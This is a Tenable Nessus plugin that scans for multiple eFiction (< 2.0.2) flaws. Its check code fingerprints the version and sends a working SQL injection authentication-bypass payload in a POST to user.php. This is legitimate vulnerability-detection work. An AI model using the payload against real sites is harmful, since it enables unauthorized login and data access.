#
# (C) Tenable Network Security
#


if (description) {
  script_id(20349);
  script_version("$Revision: 1.6 $");

  script_cve_id(
    "CVE-2005-4167",
    "CVE-2005-4168",
    "CVE-2005-4169",
    "CVE-2005-4170",
    "CVE-2005-4171",
    "CVE-2005-4172",
    "CVE-2005-4173",
    "CVE-2005-4174"
  );
  script_bugtraq_id(15568);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"21118");
    script_xref(name:"OSVDB", value:"21119");
    script_xref(name:"OSVDB", value:"21120");
    script_xref(name:"OSVDB", value:"21121");
    script_xref(name:"OSVDB", value:"21122");
    script_xref(name:"OSVDB", value:"21123");
    script_xref(name:"OSVDB", value:"21124");
    script_xref(name:"OSVDB", value:"21125");
    script_xref(name:"OSVDB", value:"21126");
  }

  script_name(english:"eFiction < 2.0.2 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in eFiction < 2.0.2");
 
  desc = "
Synopsis :

The remote web server has a PHP application that is affected by
multiple flaws. 

Description :

The remote host is running eFiction, an open-source application in PHP
for writers. 

The installed version of eFiction is affected by numerous flaws :

  - Members may be able to upload files containing arbitrary  
    PHP code disguised as image files and then run that code 
    on the remote host subject to the privileges of the web 
    server user id. If an attacker does not yet have access,
    he can register and have a password mailed to him 
    automatically.

  - User-supplied input to several parameters and scripts is 
    used without sanitation, which can lead to SQL injection
    attacks provided PHP's 'magic_quotes_gpc' is disabled.
    These issues can be exploited, for example, to bypass
    authentication or disclose sensitive information.

  - User-supplied input to the 'let' parameter of the 
    'titles.php' script is not sanitized before being used
    in dynamically-generated web pages, which leads to 
    cross-site scripting attacks.

  - An unauthenticated attacker may be able to gain
    information about the installation and configuration of
    PHP on the remote host by requesting the 'phpinfo.php'
    script or to learn the install path by a direct request
    to the 'storyblock.php' script with no arguments.

  - Unauthenticated attackers may be able to access the 
    'install.php' and/or 'upgrade.php' scripts and thereby
    modify the installation on the remote host.

See also :

http://retrogod.altervista.org/efiction2_xpl.html
http://archives.neohapsis.com/archives/bugtraq/2005-11/0301.html
http://efiction.wallflowergirl.com/forums/viewtopic.php?t=1553

Solution : 

Upgrade to eFiction 2.0.2 or later.

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/efiction", "/eFiction", "/fanfiction", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Make sure the user.php script exists.
  req = http_get(item:string(dir, "/user.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does and looks like eFiction...
  if (
    '<form method="POST"' >< res &&
    egrep(pattern:'<INPUT .*name="penname"', string:res) &&
    egrep(pattern:'<INPUT type="password" .*name="password"', string:res)
  ) {
    # Determine how to exploit the flaw.
    basic_exploit = string("'UNION SELECT 'd41d8cd98f00b204e9800998ecf8427e','", SCRIPT_NAME, "',0,'',1,'me@example.com'");
    # - eFiction 2.0
    if ('<li ><a href="search.php?action=recent">' >< res) {
      ver = "2.0";
      exploit = string(basic_exploit, ",'',''/*");
    }
    # - eFiction 1.1
    else if ('&nbsp;<a class="menu" href="search.php?action=recent">' >< res) {
      ver = "1.1";
      exploit = string(basic_exploit, ",''/*");
    }
    # - eFiction 1.0 (both bluepurple and zelda skins).
    else if ('| <a class="menu" href="search.php?action=recent"' >< res) {
      ver = "1.0"; 
      exploit = string(basic_exploit, "/*");
    }
    else {
      ver = NULL;
      exploit = NULL;
    }

    # Try to exploit the flaw if we know how to.
    if (!isnull(exploit)) {
      postdata = string(
        "penname=", exploit, "&",
        "password=&",
        "submit=submit"
      );
      req = string(
        "POST ", dir, "/user.php HTTP/1.1\r\n",
        "Host: ", get_host_name(), "\r\n",
        "Content-Type: application/x-www-form-urlencoded\r\n",
        "Content-Length: ", strlen(postdata), "\r\n",
        "\r\n",
        postdata
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
      if (res == NULL) exit(0);

      # There's a problem if...
      if (
        # we're logged in directly or...
        '<a href="admin.php">Admin</a>' >< res ||
        # we're redirected to user.php with a session cookie.
        (
          "Location: user.php" >< res &&
          "Set-Cookie: PHPSESSID=" >< res
        ) ||
        # we couldn't log in because magic_quotes was enabled but we're 
        # running an older version that might suffer from other flaws.
        # 
        # nb: the fix doesn't even try to check the username / password combo.
        '<a href="user.php?action=lostpassword">' >< res
      ) {
        security_warning(port);
        exit(0);
      }
    }
  }
}
